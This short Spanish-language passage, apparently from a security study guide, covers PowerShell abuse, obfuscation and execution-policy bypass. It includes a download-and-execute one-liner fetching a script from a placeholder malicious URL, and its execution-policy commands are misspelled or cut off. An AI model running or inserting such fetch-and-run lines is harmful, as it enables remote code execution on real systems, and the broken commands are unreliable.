
Los *mecanismos de detección* son esenciales para monitorear, analizar y mitigar el posible abuso de PowerShell en entornos empresariales.
## Eludir las funciones de seguridad
- **Ofuscación**: Utilizar herramientas como *`Invoke-Obfuscation`* para codificar o disfrazar scripts.
```shell
IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/script.ps1')
```

## Eludir política de ejecución
La *Política de ejecución* no es una medida de seguridad, sino que esta presente para evitar que el usuario ejecute scripts accidentalmente.

Lo primero que tendremos que realizar será consultar la *política de ejecución* actual.
```shell
Get-ExecutionPolicity
```

Para evitar que esta politica nos restrinja podemos evadirlaa usando:
```shell
powershell -ExecutionPolic
```
